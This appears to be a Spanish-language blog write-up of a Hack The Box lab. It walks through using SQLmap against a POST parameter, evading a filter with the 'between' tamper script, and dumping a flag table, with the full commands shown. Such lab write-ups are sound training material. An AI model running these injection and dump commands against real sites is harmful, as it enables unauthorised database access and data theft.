--- 
title: "Laboratorio de Fundamentos de SQLmap"  
date: 2025-08-25
tags: [hackthebox, SQLi, web]
categories: ["SQLi", "Hack The Box"]
summary: "En este laboratorio utilizamos **SQLmap** para identificar y explotar una vulnerabilidad de **SQLi**. Tras interceptar una petición `POST`, guardamos la solicitud y la analizamos con `SQLmap`, que nos da una recomendación para evadir filtros.  Exploramos la base de datos y dentro de ella la tabla **final_flag**, la cual logramos dumpear exitosamente."
draft: false 

---
![](../../../../../images/Miniaturas/sqlmap.png)
#### Enunciado
Se le otorga acceso a una aplicación web con mecanismos de protección básicos. Utilice las habilidades aprendidas en este módulo para identificar la vulnerabilidad SQLi con SQLMap y explotarla como corresponda. Para completar este módulo, busque la vulnerabilidad y envíela aquí.

**¿Cuál es el contenido de la tabla final_flag?**
Vamos a la dirección url que nos dan y vemos esto:

![](../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-1.png)

Hacemos un poco de investigación de la página. 
Y vemos que al añadir un producto al carrito tenemos una solicitud `POST` con un `id`, con esta solicitud vamos a intentar empezar. Guardamos la solicitud en un archivo,  `action.txt.`

![](../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-2.png)
Lanzamos la acción:
```bash
sqlmap -r action.txt --batch
```

![](../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-3.png)
Y vemos que nos da información importante, nos da el gestor de Base de Datos es `Mysql`, además nos sugiere que utilicemos el `--tamper=between` porque ve que le esta bloqueando este tipo de solicitudes.
Ponemos el parametro `--schema` para tener una visión de la BD.
```bash
sqlmap -r action.txt --batch --schema --tamper=between
```

![](../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-4.png)
Y vemos una BD llamada production donde una de las tablas es final_flag. Que es lo que nos están preguntando.

```bash
sqlmap -r action.txt --batch -D production -T final_flag --tamper between --dump
```
Intentamos dumpear los datos de la tabla que nos interesa:

![](../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-5.png)

Es posible que luego de varias consultas en sqlmap te bloquee la aplicación y no te devuelva los resultados esperados, se recomienda resetear la instancia de HTB.

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.